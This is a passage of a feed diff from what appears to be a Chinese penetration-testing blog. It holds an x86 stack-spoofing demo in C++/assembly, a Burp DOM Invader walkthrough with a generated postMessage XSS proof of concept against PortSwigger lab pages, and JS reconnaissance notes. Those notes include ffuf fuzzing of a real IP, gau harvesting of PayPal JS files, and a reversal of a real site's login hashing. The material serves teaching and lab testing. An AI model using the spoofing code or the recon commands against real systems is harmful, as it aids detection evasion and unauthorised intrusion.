+<li>根据创建 Dummy 对象的顺序，在它们超出范围时将其<strong>销毁</strong></li>
+<li>除了包含 catch 语句的 main 之外，其他函数均未完成</li>
+<li>函数 A 绝不会从其对 B() 的调用返回，并且 B 绝不会从其对 C() 的调用返回</li>
+</ol>
+</blockquote>
+<h2 id="栈回溯">栈回溯</h2>
+<pre><code class="language-cpp">#include &lt;stdio.h&gt;
+#include &lt;excpt.h&gt;
+#include &lt;conio.h&gt;
+
+#pragma warning(disable: 4311 4312 4313)
+
+int fake_ebp_1, fake_ebp_2;
+
+void __stdcall _StackTrace(int StackBase, int ebp, int esp)
+{
+    int limit = 30, retaddr, calladdr;
+    printf(&quot;ebp      ret      call\n&quot;);
+    while ((ebp &gt; esp) &amp;&amp; (ebp &lt; StackBase) &amp;&amp; (limit--)) 
+        {
+            retaddr = *(int *)(ebp + 4);
+            calladdr = 0;
+            __try 
+                {
+                if (*(unsigned char *)(retaddr - 5) == 0xe8) 
+                {	
+                calladdr = *(int *)(retaddr - 4) + retaddr;
+            }
+        } __except (EXCEPTION_EXECUTE_HANDLER) {}
+    printf(&quot;%08x %08x %08x\n&quot;, ebp, retaddr, calladdr);
+    ebp = *(int *)ebp;
+}
+printf(&quot;trace completed.\n&quot;);
+}
+
+__declspec(naked) void __stdcall StackTrace()
+{
+// iceboy's stack trace
+__asm {
+push esp
+push ebp
+push fs:[0x4]        //; StackBase
+    call _StackTrace
+        retn
+        }
+    }
+
+void b(int, int)
+{
+    StackTrace();
+}
+
+void a(int, int, int)
+{
+    b(0, 0);
+}
+
+int search_call(int fn1, int fn2)
+{
+    while (true) 
+        {
+            if (*(unsigned char *)(fn1++) == 0xe8)	
+            {										
+                if ((*(int *)fn1 + fn1 + 4) == fn2)
+                {																	
+                    return fn1 + 4;					
+                }
+            }
+        }
+}
+
+// fake call
+__declspec(naked) void __stdcall d(int, int)
+{
+__asm {
+push fake_ebp_1
+push ebp
+mov ebp, esp
+    push fake_ebp_2
+push ebp
+mov ebp, esp
+call StackTrace
+pop esp
+pop ebp
+pop eax
+retn 8
+    }
+    }
+
+    // fake call &amp; hide self
+__declspec(naked) void __stdcall e(int, int)
+{
+__asm {
+push ebp
+mov ebp, [ebp]
+    push 0
+push 0
+    call d
+pop ebp
+retn 8
+    }
+    }
+
+void c(int, int, bool hideself)
+{
+    if (!hideself) 
+    {
+        d(0, 0);
+    } else 
+    {
+        e(0, 0);
+    }
+}
+
+int main()
+{
+    fake_ebp_1 = search_call((int)main, (int)a);
+    fake_ebp_2 = search_call((int)a, (int)b);
+
+
+    printf(&quot;address of function a:    0x%08x\n&quot;, a);
+    printf(&quot;address of function b:    0x%08x\n&quot;, b);
+    printf(&quot;address of function c:    0x%08x\n&quot;, c);
+    printf(&quot;address of function main: 0x%08x\n&quot;, main);
+
+    printf(&quot;\ntest 1: standard call\n&quot;);
+    a(0, 0, 0);
+
+    printf(&quot;\ntest 2: fake call\n&quot;);
+    c(0, 0, false);
+
+    printf(&quot;\ntest 3: fake call &amp; hide self\n&quot;);
+    c(0, 0, true);
+
+    printf(&quot;\npress any key to continue...&quot;);
+    _getch();
+    printf(&quot;\n&quot;);
+    return 0;
+}
+</code></pre>
+<h3 id="代码解释">代码解释</h3>
+<pre><code class="language-cpp">		fake_ebp_1 = search_call((int)main, (int)a);
+		fake_ebp_2 = search_call((int)a, (int)b);
+</code></pre>
+<pre><code class="language-cpp">int search_call(int fn1, int fn2)
+{
+    while (true) 
+	{
+        if (*(unsigned char *)(fn1++) == 0xe8)	
+		{										
+            if ((*(int *)fn1 + fn1 + 4) == fn2)
+			{																	
+				 return fn1 + 4;					
+            }
+        }
+    }
+}
+</code></pre>
+<p>对于E8 call可以用来计算被调函数的首地址</p>
+<blockquote>
+<p>e8后面的四字节机器码是此时指令指针（EIP）的值与目的地址（被调函数首地址）的差值，也即两地址间的相对偏移<br>
+指令指针在这里可以叫做返回地址，意思就是从被调函数返回后应执行的第一条指令的地址<br>
+目的地址（被调函数首地址）： 目的地址 =  返回地址 +  相对偏移</p>
+</blockquote>
+<p><img src="https://pyroxenites.github.io/post-images/1673231287351-62f58bed-65c0-4004-a414-0630118b0b66.png" alt="image.png" loading="lazy"><br>
+0092D07+FFFF3F6C = 00921073</p>
+<blockquote>
+<p>故上述代码中</p>
+<ul>
+<li>fn1+4    返回地址</li>
+<li>fn2         目标地址</li>
+<li>*(int *)fn1 偏移量</li>
+<li>fake_ebp_1 main函数调用a函数的后的返回地址</li>
+<li>fake_ebp_2 a函数调用b函数后的返回地址</li>
+</ul>
+</blockquote>
+<pre><code class="language-cpp">    printf(&quot;address of function a:    0x%08x\n&quot;, a);
+    printf(&quot;address of function b:    0x%08x\n&quot;, b);
+    printf(&quot;address of function c:    0x%08x\n&quot;, c);
+    printf(&quot;address of function main: 0x%08x\n&quot;, main);
+</code></pre>
+<p>反汇编后发下结果输出的并不是这几个函数的真正首地址，而是它们在 静态函数跳转表 中的地址<br>
+<img src="https://pyroxenites.github.io/post-images/1673234131119-f26e804e-6fe4-450e-a223-52ff52202486.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1673234140155-11f3fb44-7dde-44df-b850-de08cb27101c.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>ILT是一种用于静态函数跳转的表，它通过记录函数入口并跳转实现间接调用，这有助于提高程序的效率，特别是在调试阶段。ILT在编译release程序时不再使用。</p>
+</blockquote>
+<blockquote>
+<p>其他知识:<br>
+__declspec(naked)<br>
+裸函数（naked function）是指在编译器生成代码时没有通常的形成栈的语句块（参数、局部变量的入栈操作），在函数结束时也没有恢复栈的动作（参数、局部变量的出栈操作，以及返回语句）的函数。裸函数可以自己完成参数的入栈出栈操作及返回操作，通常使用内嵌汇编码的方式完成。裸函数在写虚拟设备驱动时特别有用，但仅在x86系列CPU中有效。</p>
+</blockquote>
+<p>方便进行栈欺骗</p>
+<blockquote>
+<p>注意点:如果使用_declspec(naked)修饰的话，要注意自己恢复堆栈平衡</p>
+</blockquote>
+<pre><code class="language-cpp">__declspec(naked) void __stdcall d(int, int)
+{
+    __asm {
+    push fake_ebp_1
+    push ebp
+    mov ebp, esp
+        push fake_ebp_2
+    push ebp
+    mov ebp, esp
+    call StackTrace
+    pop esp
+    pop ebp
+    pop eax
+    retn 8
+        }
+}
+</code></pre>
+<p>可以看出在d函数中在栈上压入了fake_ebp_1和fake_ebp_2，所以回溯的时候的路径与函数调用顺序是不同的，这就是栈欺骗。<br>
+在e函数中的</p>
+<pre><code class="language-cpp">push ebp
+mov ebp, [ebp]
+</code></pre>
+<p>这里并不是将ebp赋值为当前的esp，而是[ebp]，也就是main函数的栈基址，所以在我们回溯的时候就会忽略函数c的函数栈帧，这也是栈欺骗的一个手段。</p>
+<h2 id="其他问题">其他问题</h2>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/jpeg/8363097/1673416446207-3ff4fdf0-023e-49f9-8f61-a0ebd2459efa.jpeg#averageHue=%23222121&amp;clientId=u2386f88d-42bc-4&amp;from=paste&amp;height=121&amp;id=u6c3192b9&amp;originHeight=181&amp;originWidth=652&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=48883&amp;status=done&amp;style=none&amp;taskId=u9a220bc9-675a-47cd-b47b-e14ce2f8451&amp;title=&amp;width=434.6666666666667" alt="img_v2_66b07202-c998-4db8-b6b4-bd9d10ca4deg.jpg" loading="lazy"><br>
+问: 为什么这个返回地址00007FF69CC32387 + 偏移量 FFFFEED6 = 7FF7 9CC3 125D 不等于目标地址 07FF69CC3125Dh</p>
+<blockquote>
+<p>答:<br>
+计算机以补码的形式存放数据，所以E8 指令后的4个字节偏移值也是以补码的形式存放的，在计算时如果要跳转的目标地址在E8指令所在的地址前面相对偏移是负值，如果在E8指令所在的地址后面，相对偏移是正值。在手动计算时要将其还原为原码再参与计算。<br>
+正数的补码、原码、反码都等于其自身，所以可以直接相加。<br>
+负数的补码转换为原码需要对其 标志位外的其他位取反 +1，还原为原码后再进行相加。<br>
+在X86下，因为地址宽度和偏移的数据宽度一致，所以相加后的进位会被舍弃掉。<br>
+在X64下，因为地址宽度大于偏移宽度，所以相加后的进位会被保留，所以就导致了计算的错误产生，在写程序时可以只使用低32位的地址与 偏移值进行运算，再进位丢弃后再与高32位的地址进行拼接。</p>
+</blockquote>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Burp技巧DOM Invader使用]]></title>
+        <id>https://pyroxenites.github.io/post/burp-ji-qiao-dom-invader-shi-yong/</id>
+        <link href="https://pyroxenites.github.io/post/burp-ji-qiao-dom-invader-shi-yong/">
+        </link>
+        <updated>2022-07-18T05:51:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="前言">前言</h2>
+<p>大多数现代网站都使用多个JavaScript库，并且有很多行复杂的压缩代码，这使得对DOM XSS的测试变得非常令人头痛，PortSwigger安全研究部门专门开发了DOM Invader，使对DOM XSS的测试更加容易</p>
+<blockquote>
+<p>Dom Invader会自动识别页面所有可控的Source（源）和Sink（汇）并将Canary（金丝雀）注入后按照危害程度进行高到低排序</p>
+</blockquote>
+<p>DOM Invader 探测目标的 DOM，拦截它可能遇到的任何 JavaScript 源和汇，并将它们组织起来供你使用<br>
+DOM Invader会对汇（Sinks）进行排序，使最有价值的的汇（Sinks）排列在最前面</p>
+<p>source:表示任何允许用户控制的输入的JavaScript对象，例如：location.search<br>
+sink:表示任何允许JavaScript/HTML执行的函数或设置器，例如：eval、document.write<br>
+canary:这也是BurpSuite定义的一个概念，这里你可以理解为是一个字符串，是一个独特的字符串，用于查看用户输入在汇（Sinks）中的反映，默认情况下，DOM Invader使用一个随机的金丝雀（canary），不过你也可以将这个值自定义为你喜欢的任何值</p>
+<hr>
+<p>从Burp 2021.7版本,burp自带的浏览器就集成了该插件<br>
+不过默认情况下DOM Invader是关闭的，你需要手动开启<br>
+<img src="https://pyroxenites.github.io/post-images/1651535927747-143de6ed-c90e-4646-a618-a7d7226c2eba.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1651535965856-cf7d2baf-2b56-47d0-bea3-48ecef2a2807.png" alt="image.png" loading="lazy"></p>
+<h2 id="使用">使用</h2>
+<p>开启插件后f12查看是否可以使用</p>
+<p>当你打开后<br>
+它显示任何包含金丝雀（Canary）值的源（Sources）和汇（Sinks），以及所有可用的源（Sources）和汇（Sinks）的树状视图。<br>
+当你找到一个有趣的汇（Sinks），你可以看到其中包含的值，以及堆栈跟踪，并会突出显示你的金丝雀（Canary），通过Augmented DOM，你也可以检查你自定义的金丝雀（Canary）值是否被正确编码。<br>
+其他有用的功能包括能够搜索发送到汇（Sinks）的值，以及自动将金丝雀（Canary）注入到URL参数和表单元素中<br>
+<img src="https://pyroxenites.github.io/post-images/1651536020970-3da187f9-4ddd-46c1-828f-effa7c660cfa.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1651536117144-675282d4-ebc7-4467-ad36-e274a5fd0d4c.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>portswigger官方靶场<br>
+<a href="http://portswigger-labs.net/dom-invader/">http://portswigger-labs.net/dom-invader/</a><br>
+https://portswigger-labs.net/dom-invader/testcases/augmented-dom-eval/index.php  url注入</p>
+<p>pikachu靶场 表单注入</p>
+</blockquote>
+<h3 id="url注入">URL注入</h3>
+<p><img src="https://pyroxenites.github.io/post-images/1651537859800-0374f357-6776-4819-91f8-1f6c5015e2ab.png" alt="image.png" loading="lazy"><br>
+首先单击Test 发现为get请求，url多了x参数。<br>
+<img src="https://pyroxenites.github.io/post-images/1651537882171-5d258ad8-c989-4a4e-9656-cb7984c67d9c.png" alt="image.png" loading="lazy"><br>
+将Canary 注入到URL<br>
+<img src="https://pyroxenites.github.io/post-images/1651537921440-82240547-cd33-499f-9285-4cf4ed615dbe.png" alt="image.png" loading="lazy"><br>
+发现Sinks中有个标红的eval()，单击右边蓝色的Stack Trace进行跟踪,具体位置它会显示在console窗口<br>
+<img src="https://pyroxenites.github.io/post-images/1651537934925-44b564ff-9f82-4220-8550-ae640c38155a.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1651537944045-239ca34c-2a6a-4259-bac9-8dec18ca6092.png" alt="image.png" loading="lazy"><br>
+跟进来发现是eval(x)出了错<br>
+<img src="https://pyroxenites.github.io/post-images/1651537950497-b4003f3c-59f3-490a-9cbb-82e112b08bb2.png" alt="image.png" loading="lazy"></p>
+<h3 id="表单注入">表单注入</h3>
+<p>pikachu靶场<br>
+<img src="https://pyroxenites.github.io/post-images/1651537091325-0f337a7f-5895-4578-b2ac-80e5dff8b394.png" alt="image.png" loading="lazy"><br>
+这里是基于表单的DOM XSS<br>
+所以我们将金丝雀，也就是payload注入表单即可</p>
+<p><img src="https://pyroxenites.github.io/post-images/1651537175993-d1fc1ac7-3384-4d04-a7a9-093403ba14c7.png" alt="image.png" loading="lazy"><br>
+随后发现Sinks中有个标红的innerHTML参数<br>
+单机右边蓝色的Stack Trace可进行追踪。具体位置他会显示在console窗口中<br>
+<img src="https://pyroxenites.github.io/post-images/1651537306112-6d157244-b5c0-47f9-b4fb-c8e8524bdfc5.png" alt="image.png" loading="lazy"></p>
+<p><img src="https://pyroxenites.github.io/post-images/1651537345290-a28901da-2a8a-40b3-9789-146e7edab6a0.png" alt="image.png" loading="lazy"><br>
+跟踪进来以后发现出现问题的地方<br>
+<img src="https://pyroxenites.github.io/post-images/1651537403374-888d77be-6480-4675-a1f0-201aef2a1ef8.png" alt="image.png" loading="lazy"></p>
+<h2 id="事件监听器与重定向">事件监听器与重定向</h2>
+<blockquote>
+<p>靶场<br>
+<a href="https://portswigger-labs.net/dom-invader/testcases/augmented-dom-click-location-replace/index.php?x=burpdomxss">https://portswigger-labs.net/dom-invader/testcases/augmented-dom-click-location-replace/index.php?x=burpdomxss</a></p>
+</blockquote>
+<p><img src="https://pyroxenites.github.io/post-images/1651537660191-3ae7bccb-ef3b-4088-a973-cdf77b0a261b.png" alt="image.png" loading="lazy"><br>
+开启自动点击事件与禁止重定向</p>
+<blockquote>
+<p>click事件触发时候会执行location.replace(x)当前页面会进行文档替换(刷新)，并且禁止回退。所以js中的堆栈数据刷新了自然就没有数据了</p>
+</blockquote>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1651538103247-2ff81e64-8194-4a6c-b1f9-ee27d85f5764.png" alt="image.png" loading="lazy"></figure>
+<p>比如在这个靶场中我们不开启这个功能，会什么都查询不到<br>
+<img src="https://pyroxenites.github.io/post-images/1651538069860-177a3d2d-b69b-4bde-a496-fb82728808e7.png" alt="image.png" loading="lazy"></p>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1651538057130-b5d0ca26-1286-4157-b4dc-fa42b47790ac.png" alt="image.png" loading="lazy"></figure>
+<h2 id="消息拦截器">消息拦截器</h2>
+<blockquote>
+<p>靶场<br>
+<a href="https://portswigger-labs.net/dom-invader/testcases/postmessage-eval-iframe-multiple/">https://portswigger-labs.net/dom-invader/testcases/postmessage-eval-iframe-multiple/</a></p>
+</blockquote>
+<p>此功能需要开启Postmessage interception功能</p>
+<blockquote>
+<p>三个子功能可以不开启，不过开启后，危害效果更佳明显</p>
+</blockquote>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1651538182773-94f0572e-0ff1-495e-8e15-145b66de64e0.png" alt="image.png" loading="lazy"></figure>
+<p><img src="https://pyroxenites.github.io/post-images/1651538481861-67dc7f21-e8e1-4248-a3e2-2a5538e48c69.png" alt="image.png" loading="lazy"><br>
+查看堆栈eval(x)<br>
+直接修改payload选择发送<br>
+<img src="https://pyroxenites.github.io/post-images/1651538633131-0bb6d764-a1ef-4884-b39d-1722c275ac8e.png" alt="image.png" loading="lazy"><br>
+Build POC，能将payload改成恶意代码后生产一个iframe加载，复制到剪贴板上<br>
+点击就会跳转弹窗</p>
+<pre><code class="language-cpp">
+        &lt;!doctype html&gt;
+        &lt;html&gt;
+            &lt;head&gt;
+                &lt;!-- DOM XSS PoC - generated by DOM Invader part of Burp Suite --&gt;
+                &lt;meta charset=&quot;UTF-8&quot; /&gt;
+                &lt;title&gt;Postmessage PoC&lt;/title&gt;
+                &lt;script&gt;
+                    function pocLink() {
+                        let win = window.open('https://subdomain1.portswigger-labs.net/dom-invader/testcases/postmessage-eval-iframe-multiple/external.html');
+                        let msg = &quot;javascript:alert(1)&quot;;
+                        
+                        setTimeout(function(){
+                            win.postMessage(msg, '*');
+                        }, 5000);
+                    }
+                    function pocFrame(win) {           
+                        let msg = &quot;javascript:alert(1)&quot;;
+                        
+                        win.postMessage(msg, '*');          
+                    }
+                &lt;/script&gt;
+            &lt;/head&gt;
+            &lt;body&gt;
+                &lt;a href=&quot;#&quot; onclick=&quot;pocLink();&quot;&gt;PoC link&lt;/a&gt;          
+                &lt;iframe src=&quot;https://subdomain1.portswigger-labs.net/dom-invader/testcases/postmessage-eval-iframe-multiple/external.html&quot; onload=&quot;pocFrame(this.contentWindow)&quot;&gt;&lt;/iframe&gt;                    
+            &lt;/body&gt;
+        &lt;/html&gt;
+        
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[渗透过程中的JS]]></title>
+        <id>https://pyroxenites.github.io/post/shen-tou-guo-cheng-zhong-de-js/</id>
+        <link href="https://pyroxenites.github.io/post/shen-tou-guo-cheng-zhong-de-js/">
+        </link>
+        <updated>2022-06-08T05:43:46.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>渗透很多进去点都在登录处<br>
+随着安全的不断推进,前端加密这些选项应对不得不学习</p>
+</blockquote>
+<h1 id="要点">要点</h1>
+<ol>
+<li>JS信息收集:URL/API/密码/业务逻辑</li>
+<li>JS加密 : RAS/签名校验</li>
+<li>JS混淆/反混淆 字符串混淆/eval混淆/函数数组对象混淆/OB混淆</li>
+</ol>
+<h1 id="chrome-debug一些技巧">chrome debug一些技巧</h1>
+<h2 id="搜索功能ctrlshiftfctrlf">搜索功能(ctrl+shift+f)(ctrl+f)</h2>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1648965711007-8e1dff99-58b1-4d69-8fa4-dc8799cd88f5.png" alt="image.png" loading="lazy"></figure>
+<h2 id="搜索文件ctrlo">搜索文件(ctrl+o)</h2>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1648966858441-7e3533bd-cda4-4bd9-a041-caa55e8d0afb.png" alt="image.png" loading="lazy"></figure>
+<h2 id="显示文件成员函数ctrlshifto">显示文件成员函数(ctrl+shift+o)</h2>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1648967866679-6f8fff51-ad5d-44fc-9f23-a9822d13c53f.png" alt="image.png" loading="lazy"></figure>
+<h2 id="编写js代码">编写js代码</h2>
+<p><img src="https://pyroxenites.github.io/post-images/1648967965805-027e83a3-949a-42c1-8ccf-e271ab769e97.png" alt="image.png" loading="lazy"><br>
+格式化<br>
+<img src="https://pyroxenites.github.io/post-images/1648966896899-d6e3f4b3-d637-43b6-bf3c-36a71c7ed3f9.png" alt="image.png" loading="lazy"></p>
+<h2 id="断点调试">断点调试</h2>
+<p>在行数点击一下可以下一个断点<br>
+<img src="https://pyroxenites.github.io/post-images/1648967390338-5ddd8f93-7721-47d9-8840-08bbd444c006.png" alt="image.png" loading="lazy"><br>
+给 DOM 元素设置断点</p>
+<blockquote>
+<p>设置好断点后，当 DOM 元素要被修改时，代码就会在自动停留在修改处。</p>
+</blockquote>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1648967688396-88b1b8ab-bff8-46cf-9339-26c27813497f.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<ol>
+<li>（等号）pause script execution<br>
+–&gt;暂停脚本执行 -&gt; 常用在一个方法调用多个js文件时，涉及到的js代码比较长，则会使用到这个按钮(相当于从一个断点调到下一个断点)</li>
+<li>（半弧箭头）step 快捷键：F9<br>
+–&gt;单步执行 注意：遇到子函数会进去继续单步执行-&gt; 每点击它一次，js语句就会往后执行一句</li>
+<li>（下箭头）step into 快捷键：F11 全称：step into next function call<br>
+–&gt;单步执行，遇到子函数就进去继续单步执行</li>
+<li>（上箭头）step over 快捷键：F10 全称：step over next function call<br>
+–&gt;单步执行，遇到子函数并不进去，将子函数执行完并将其作为一个单步</li>
+<li>（右箭头）step out 快捷键：Shift + F11 全称：step out of current function<br>
+–&gt;直接跳出当前的函数，返回父级函数</li>
+<li>（右粗箭头，点击一下多一个斜线，再次点击就取消了）deactivate breakpoints or activate breakpoints<br>
+–&gt;禁用断点/启用断点</li>
+<li>（圆形等号）pause on execution<br>
+–&gt;暂停执行</li>
+</ol>
+</blockquote>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1648968138565-272d51ba-25c7-49b5-a825-a134cf2bbccb.png" alt="image.png" loading="lazy"></figure>
+<p>XHR(XMLHttpRequest)断点</p>
+<blockquote>
+<p>通过监听 xhr 的断点，可以轻而易举的找到事件的触发点和调用堆栈</p>
+</blockquote>
+<p>通过数据包发现加密和请求路径<br>
+<img src="https://pyroxenites.github.io/post-images/1648977719037-740a68a0-ffcf-45c9-8205-cb35f81a2702.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648977729723-1830272d-e6da-402b-bf77-e15b06d2c5ff.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>他会拦截包含这个路径的时候的包</p>
+</blockquote>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1648977793825-1faed094-9ee5-44e8-82c3-443536f2bd16.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>在发包的时候停止下来</p>
+</blockquote>
+<figure data-type="image" tabindex="7"><img src="https://pyroxenites.github.io/post-images/1648977832611-68e56aa6-d6fa-4606-b733-7d9412bd2798.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>然后通过堆栈信息找到加密的参数</p>
+</blockquote>
+<figure data-type="image" tabindex="8"><img src="https://pyroxenites.github.io/post-images/1648978166957-845099e3-dcb6-4164-98f3-c02feea55d09.png" alt="image.png" loading="lazy"></figure>
+<h2 id="监视器">监视器</h2>
+<p>监控执行当前断点所在作用域任何表达式的执行结果<br>
+<img src="https://pyroxenites.github.io/post-images/1648967084818-b0586404-85aa-46f2-a6d2-93bb704b5c11.png" alt="image.png" loading="lazy"></p>
+<h2 id=""></h2>
+<h2 id="调用栈">调用栈</h2>
+<p>表示这个函数的调用堆栈，也就是 setState 是被哪个上层函数调用的，上层函数又是谁调用的...<br>
+<img src="https://pyroxenites.github.io/post-images/1648967315570-4ea6a1f4-2b76-484c-9f56-16983d97a282.png" alt="image.png" loading="lazy"></p>
+<h2 id="流量清楚">流量清楚</h2>
+<p><img src="https://pyroxenites.github.io/post-images/1648980560297-2c196e4b-03d8-4cf4-8d5c-40314ce37b60.png" alt="image.png" loading="lazy"><br>
+排除干扰流量</p>
+<h1 id="汽车之家演示">汽车之家演示</h1>
+<blockquote>
+<p><a href="https://account.autohome.com.cn/">https://account.autohome.com.cn/</a><br>
+跟方便理解</p>
+</blockquote>
+<p><img src="https://pyroxenites.github.io/post-images/1648964217000-f11a6b62-0702-442f-abef-b492e7fa9d06.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648964272947-e7182d00-c912-47e0-b56b-b39eeca8ed94.png" alt="image.png" loading="lazy"><br>
+发现密码被加密了</p>
+<p>我们全局搜索一下pwd关键字,发现应是经过md5加密过得<br>
+<img src="https://pyroxenites.github.io/post-images/1648964373872-67704b34-6325-4921-8d6e-4f6f8b480c99.png" alt="image.png" loading="lazy"></p>
+<p>打上断点准备进行调试</p>
+<p><img src="https://pyroxenites.github.io/post-images/1648964447473-7c2d4caa-442b-4393-b5ff-29b4e713d690.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648964490699-c4561222-9a39-4422-9522-5c2952f7c02e.png" alt="image.png" loading="lazy"></p>
+<p>看到自己的明文密码<br>
+<img src="https://pyroxenites.github.io/post-images/1648964534777-d701303f-eefb-498b-a777-b0fbada2a7a4.png" alt="image.png" loading="lazy"><br>
+在控制台运行一下<br>
+<img src="https://pyroxenites.github.io/post-images/1648965450459-1d2ef007-0d11-4e76-9d00-bddfa429625b.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648965460884-fb405993-1bcd-4893-9062-a425fa95296d.png" alt="image.png" loading="lazy"><br>
+至此找到加密的函数<br>
+随后我们进入hex_md5,这个加密密码的函数</p>
+<blockquote>
+<p><a href="https://jsfiddle.net/">https://jsfiddle.net/</a><br>
+<a href="http://jsrun.net/new">http://jsrun.net/new</a></p>
+</blockquote>
+<p>把hex_md5复制到运行js的地方,不断找到没有被定义的函数,然后复制过来<br>
+<img src="https://pyroxenites.github.io/post-images/1648965040245-61728fb5-7474-436b-a8af-1bb725a60d5f.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1648965058370-265af940-c4a1-4faf-bd0f-c2e2469f3851.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>如果发现都在一个JS文件中,猜测这个JS文件是加密文件可以整个复制<br>
+最终只把加密逻辑部分弄过来就好</p>
+</blockquote>
+<figure data-type="image" tabindex="9"><img src="https://pyroxenites.github.io/post-images/1648968595691-3d9a800d-5603-4505-b834-48a031d30216.png" alt="image.png" loading="lazy"></figure>
+<h1 id="寻找js接口">寻找JS接口</h1>
+<p>我们可以ctrl+shift+F进行全局搜索path等关键字</p>
+<p>当发现JS压缩混乱的时候,可以点击下方花括号,就能格式化JS代码<br>
+或者也可以使用Quick source viewer(chrome插件)<br>
+<img src="https://pyroxenites.github.io/post-images/1648947200201-b024012f-f63e-4c6c-9a24-2269f72666cc.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>JSfinder(py/油猴) -----JSFinderAAA/leakfinder/JSINFO-SCAN/JSFinderPlus/Tampermonkey-js  (改动版)<br>
+findsomething(chrome插件)<br>
+linkfinder(py)<br>
+gau<br>
+burpjsLinkFinder/JSFinderForBurp(burp插件)</p>
+</blockquote>
+<pre><code class="language-go">gau paypalobjects.com |grep -iE '\.js'|grep -ivE '\.json'|sort -u  &gt;&gt; paypalJS.txt
+gau paypal.com |grep -iE '\.js'|grep -ivE '\.json'|sort -u  &gt;&gt; paypalJS.txt
+
+</code></pre>
+<h2 id="js-fuzz">JS FUZZ</h2>
+<p>上方的方法基本属于基于爬虫的操作,其实也可以通过爆破来确定网站具有的JS文件<br>
+毕竟fuzz出奇迹</p>
+<blockquote>
+<p><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a><br>
+<a href="https://wordlists.assetnote.io/">https://wordlists.assetnote.io/</a></p>
+</blockquote>
+<p>我们可以通过观察来寻找js所要爆破的路径</p>
+<ol>
+<li>特性</li>
+</ol>
+<blockquote>
+<p>输入https://x.x.x.x/js,当目录存在的时候会自动在后面添加上/,例如浏览器访问/js,将会变成/js/来访问<br>
+可以根据此特性进行爆破<br>
+存在403,不存在404</p>
+</blockquote>
+<ol start="2">
+<li>目录爆破工具</li>
+</ol>
+<blockquote>
+<p>也是利用扫描工具探测存在的目录<br>
+可以进行递归爆破,比如探测存在routes,再接下存在admin目录<br>
+原理和上面差不多,比如dirsearch就会提醒</p>
+</blockquote>
+<ol start="3">
+<li>已知存在的目录</li>
+</ol>
+<blockquote>
+<p>比如https://x.x.x.x/adminjs/login.js,我们便可尝试在adminjs下进行爆破</p>
+</blockquote>
+<pre><code class="language-c">.\ffuf -mc 200 -u http://218.193.160.93:3000/js/FUZZ -w .\js.txt
+
+##无论输入什么都返回相同内容,可以用-fs排除掉指定的体积大小来进行绕过
+.\ffuf -mc 200 -u http://218.193.160.93:3000/js/FUZZ -w .\js.txt -fs 625
+</code></pre>
+<h2 id="burp-js获取">burp js获取</h2>
+<p><img src="https://pyroxenites.github.io/post-images/1648979038883-9730c272-ec50-46be-b561-674412e66295.png" alt="image.png" loading="lazy"><br>
+保存,然后利用linkfinder获取<br>
+<img src="https://pyroxenites.github.io/post-images/1648979327366-f8ea3e5d-52f5-4759-b4f0-da58816e8d0b.png" alt="image.png" loading="lazy"></p>
+<h2 id="js关键字提取">JS关键字提取</h2>
+<blockquote>
+<p><a href="https://github.com/m4ll0k/SecretFinder">https://github.com/m4ll0k/SecretFinder</a><br>
+<a href="https://github.com/m4ll0k/BBTz/blob/master/antiburl.py">https://github.com/m4ll0k/BBTz/blob/master/antiburl.py</a><br>
+<a href="https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/collector.py">https://github.com/m4ll0k/Bug-Bounty-Toolz/blob/master/collector.py</a><br>
+<a href="https://github.com/m4ll0k/BBTz/blob/master/getjswords.py">https://github.com/m4ll0k/BBTz/blob/master/getjswords.py</a><br>
+js存活<br>
+github.com/hakluke/hakcheckurl</p>
+</blockquote>
+<pre><code class="language-go">url: , POST , api , GET , setRequestHeader , send( 
+(注意:只有⼀个 (，因为它在发出 Ajax 请求时使⽤！) 
+ .headers , onreadystatechange , var {xyz} = 
+getParameter() , parameter , .theirdomain.com, apiKey
+
+postMessage , messageListenger , .innerHTML , document.write( 
+document.cookie , location.href , redirectUrl , window.hash 
+</code></pre>
+<pre><code class="language-go">cat js_files_url_list.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t
+Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
+</code></pre>
+<h2 id="敏感信息">敏感信息</h2>
